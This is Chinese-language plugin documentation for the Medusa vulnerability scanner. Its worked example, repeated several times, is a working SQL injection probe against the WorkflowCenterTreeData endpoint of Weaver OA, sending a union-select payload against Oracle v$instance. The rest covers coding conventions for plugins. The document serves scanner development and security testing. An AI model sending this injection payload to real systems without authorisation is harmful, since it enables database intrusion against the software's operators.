## 插件模板

以最新的`泛微OA`插件作为例子

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile


class VulnerabilityInfo(object):
    def __init__(self, Medusa):
        self.info = {}
        self.info['number'] = "0"  # 如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['createDate'] = "2020-10-13"  # 插件编辑时间
        self.info['disclosure'] = '2020-10-13'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Weaver_WorkflowCenterTreeDataInterfaceInjectionVulnerability"  # 插件名称
        self.info['name'] = '泛微OA_WorkflowCenterTreeData接口注入漏洞'  # 漏洞名称
        self.info['affects'] = "泛微OA"  # 漏洞组件
        self.info['desc_content'] = "泛微OA_WorkflowCenterTreeData接口注入漏洞"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "xxx版本-xxx版本"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果


def medusa(Url, RandomAgent, ProxyIp):
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = "/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333"
        payload_url = scheme + "://" + url + ":" + str(port) + payload

        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }

        s = requests.session()
        resp = s.post(payload_url,
                      data={'formids': '11111111111)))' + '\x0a\x0d' * 360 + 'union select NULL,instance_name from '
                                                                             'v$instance order by (((1'},
                      headers=headers, timeout=6, verify=False)
        con = resp.text
        code = resp.status_code
        if code == 200 and con.find('''"draggable":''') != -1 and con.find(
                '''"checked":''') != -1 and con.find('''"id":''') != -1 and con.find(
            '''"text":''') != -1:
            Medusa = "{}存在泛微OA_WorkflowCenterTreeData接口注入漏洞\r\n 验证数据:\r\nUrl:{}\r\nPayload:{}\r\n".format(url,
                                                                                                          payload_url,
                                                                                                          resp.headers)
            _t = VulnerabilityInfo(Medusa)
            web = VulnerabilityDetails(_t.info)
            web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名

```

### VulnerabilityInfo函数

```python
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['disclosure']='2019-10-13'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "XXXXXXXXXXXXXXXXXXXX"  # 插件名称
        self.info['name'] ='泛微OA_WorkflowCenterTreeData接口注入漏洞' #漏洞名称
        self.info['affects'] = "该漏洞是哪个组件的，比如这个插件就是叫：泛微OA"  # 漏洞组件
        self.info['desc_content'] = "漏洞描述，比如在组件的哪个版本，哪个位置，有什么危害，什么地方没写好或者没过滤导致的等"  # 漏洞描述
        self.info['rank'] = "这边写危害等级，比如这个插件就该写:高危"  # 漏洞等级
        self.info['suggest'] = "给出缓解措施，或者解决办法"  # 修复建议
        self.info['version'] = "xxx版本-xxx版本"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果需要传入的恒定不变

```

| 函数名       | 值           | 备注                                                         |
| :----------- | ------------ | ------------------------------------------------------------ |
| number       | CVE编号     |  如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD         |
| author       | 插件作者     |                                                              |
| create_date  | 插件编辑时间 | 格式为：年-月-日                                             |
| algroup      | 插件名称     | 要和文件名相同，并且只能英文（必须使用驼峰命名法        |
| name         | 漏洞名称     | 插件的中文名，要与插件名翻译结果相同                         |
| affects      | 漏洞组件     | 该漏洞存在哪个组件中的哪个版本                               |
| desc_content | 漏洞描述     | 漏洞描述，比如在组件的哪个版本，哪个位置，有什么危害，什么地方没写好或者没过滤导致的等 |
| rank         | 漏洞等级     | 分为：严重、高危、中危、低危四个种类                         |
| suggest      | 修复建议     | 给出缓解措施或者解决办法                                   |
| disclosure | 披露时间 | 漏洞披露时间，如果不知道就写编写插件的时间 |
| version      | 漏洞所影响的版本         | 只要写漏洞所影响的版本范围，适用于那些版本     |
| disclosure | 披露时间 | 漏洞披露时间，如果不知道就写编写插件的时间 |


### UrlProcessing函数

对`url`进行处理

```python
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port
```

函数对各个部分进行处理，最终我们只需要取得` scheme` ,` port` , ` hostname` 的值返回给调用函数就行

该函数在`2.7`插件编写规范版本中已写入`ClassCongregation`类中，调用只需要如下操作即可

```python
使用方法一：单独导入
from ClassCongregation import UrlProcessing
scheme, url, port = UrlProcessing().result(Url)
使用方法二：直接导入
import ClassCongregation
scheme, url, port = ClassCongregation.UrlProcessing().result(Url)
```



### medusa函数

```python
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = "/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333"
        payload_url = scheme + "://" + url +":"+ str(port)+ payload


        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }

        s = requests.session()
        resp = s.post(payload_url,
                      data={'formids': '11111111111)))' + '\x0a\x0d' * 360 + 'union select NULL,instance_name from '
                            'v$instance order by (((1'},
                      headers=headers, timeout=6, verify=False)
        con = resp.text
        code = resp.status_code
        if code == 200 and con.find('''"draggable":''') != -1 and con.find(
                '''"checked":''') != -1 and con.find('''"id":''') != -1 and con.find(
                '''"text":''') != -1:
            Medusa = "{}存在泛微OA_WorkflowCenterTreeData接口注入漏洞\r\n 验证数据:\r\nUrl:{}\r\nPayload:{}\r\n".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            web=VulnerabilityDetails(_t.info)
            web.High() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
```

##### 参数

###### Url

- 扫描器传入的链接

###### RandomAgent

- 扫描器传入的随机或者自定义的`User-Agent`

###### ~~ProxyIp~~（已弃用）

- ~~扫描器出入的代理，默认是关闭的~~

##### 注意点:

###### 端口

- 函数已经对端口进行处理，当存在特定的端口的时候可以把端口的值改为固定的端口号(例如`ActiveMQ`的`8161`端口

  ```python
  scheme + "://" + url +":8161"+ payload
  ```

###### User-Agent

- 该值必须为扫描器纯在的`RandomAgent`。
- 只有一种情况可以修改该值，就是该漏洞只能使用特殊的`User-Agent`头的时候。

###### Medusa

- 该值为漏洞扫描结束的值，需要传给类中，之后封装好调用类写入数据库中

- 返回结果要可读并且要那种一眼就能看出来的,例如下面给出的数据库弱口令为例，必须可读容易验证

  ```http
  www.ascotbe.com 验证数据:
  url:www.ascotbe.com:3306
  username:root
  password:root
  ```

- 如果数据是`Get`请求或者是`Post`请求并存在数据包，应该返回如下信息，验证漏洞直接使用数据包即可(利用`Post`请求举例，`Get`同理)

  ```http
  POST / HTTP/1.1
  Host: www.ascotbe.com
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
  Accept: */*
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate
  Content-Type: application/ocsp-request
  Content-Length: 83
  Connection: close
  
  id=1&name=xxx
  ```

- 移除类的返回值可以为空因为数据过于庞大，也不宜验证

###### ~~ProxyIp~~（已弃用）

- ~~必须存在如下的`if..elif`判断语句，并且里面的值`resp`需要在前面声明全局使用(例:`global resp`~~

###### 判断漏洞存在

- `if`判断一定要唯一性，唯一的返回状态码，唯一只在该漏洞存在的字符串正常页面不会存在的，如下所示:

```python
        if code == 200 and con.find('''"draggable":''') != -1 and con.find(
                '''"checked":''') != -1 and con.find('''"id":''') != -1 and con.find(
                '''"text":''') != -1:
            Medusa = "{}存在泛微OA_WorkflowCenterTreeData接口注入漏洞\r\n 验证数据:\r\nUrl:{}\r\nPayload:{}\r\n".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            web=VulnerabilityDetails(_t.info)
            web.High() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
```

###### 多个payload

- 当一个漏洞脚本存在多个`payload`的时候使用循环来验证漏洞，但是这个漏洞第一次验证存在后续还能验证出漏洞的时候，需要在前面声明`Medusas=[]`来存放

- 切记`try...except`一定要在`for`循环里面，这样如果一个`payload`出错后面的代码也已经可以运行

- `2.8`插件规范版本中加入了写入类，方便循环写入文件

- 整体替换如下:

  ```python
  def medusa(Url, RandomAgent, ProxyIp=None):
      scheme, url, port = UrlProcessing().result(Url)
      if port is None and scheme == 'https':
          port = 443
      elif port is None and scheme == 'http':
          port = 80
      else:
          port = port
      Payloads = ['x', 'xx', 'xxx', 'xxxx']
      Medusas = []#存放返回数据
      for payload in Payloads:
          try:
              payload_url = scheme + "://" + url + ":" + str(port) + payload
              headers = {
                  'Accept-Encoding': 'gzip, deflate',
                  'Accept': '*/*',
                  'User-Agent': RandomAgent,
              }
              resp = requests.post(...)
              con = resp.text
              code = resp.status_code
              if code == 200 and con.find(....):
                  Medusa = "{}存在XXX漏洞\r\n验证数据:\r\nRequests:{}\r\n".format(url, con)
                  _t = VulnerabilityInfo(Medusa)
                  web = VulnerabilityDetails(_t.info)
                  WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
                  web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
          except:
              _ = VulnerabilityInfo('').info.get('algroup')
              _l = ErrorLog().Write(url, _)  # 调用写入类
  ```

## 插件代码规范

###### 代码中未使用的Package尽量删除

![1.png](https://github.com/Ascotbe/Random-img/blob/master/docute/1.png?raw=true)

###### Dnslog使用规范

- 禁止使用如下形式

  ```python
  from ClassCongregation import Dnslog
  #使用改方法会导致类初始化2次获取的随机数和判断中所获取的随机数不同
  Dnslog().dns_host()#获取随机数
  Dnslog().result()#判断随机数是否请求成功
  ```

- 应当写成如下形式

  ```python
  from ClassCongregation import Dnslog
  dns=Dnslog()#首先初始化
  dns.dns_host()#获取随机数
  dns.result()#判断随机数是否请求成功
  ```

  

###### 变量命名规范

- 仅限使用`驼峰命名法` 、`匈牙利命名法`
- 默认使用`驼峰命名法`

###### 判断语句

- 在判断中与`None` `False` `True`等值判断时，使用`is` `not` `is not`尽量避免使用`==` `!=`

###### Requst使用

- 当使用了`request.session()`时，应该在插件结束时使用`request.close()`来主动关闭连接

  ```python
  import requests
  def Medusa():
      s=requests.session()
      get=s.get("www.ascotbe.com")
      get.close()
  ```

  

###### 禁止使用

- 插件中禁止使用`sys.exit()` `os.exit()`这两个函数，会导致主程序结束，如果要结束插件使用`return`即可

###### Https

- 如果请求中包含`HTTPS`，可以使用`verify=False`来关闭SSL证书验证

###### 异常捕获

- 每个函数必须存在`try...except`来保证扫描器正常使用

- 异常捕获`except`必须要有返回值 

  ```python
  except Exception:
      _ = VulnerabilityInfo('').info.get('algroup')
      _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
  ```
  


###### 清理工作

- 插件写完后需要清除所有的`pirint()`函数，以及不必要的变量

###### 多个Payload的for循环

- 当有多个`payload`需要循环的时候必须把`for`循环放到`try`异常捕获里面循环，这很重要！！！！！

###### 写入函数

- 一定要加入`WriteFile().result(str(url),str(Medusa))`这段代码写入

